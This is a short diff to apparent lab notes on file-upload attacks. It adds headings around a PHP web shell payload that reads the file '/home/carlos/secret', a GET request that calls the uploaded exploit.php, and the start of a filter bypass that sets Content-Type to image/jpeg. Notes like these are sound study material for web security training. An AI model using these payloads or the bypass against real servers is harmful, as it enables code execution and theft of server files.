@@ -1,5 +1,10 @@
+## Basic:
+```
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 GET /files/avatars/exploit.php HTTP/1.1
+```
+
+## Bypass:
 
 1) Content-Type to `image/jpeg`.
    
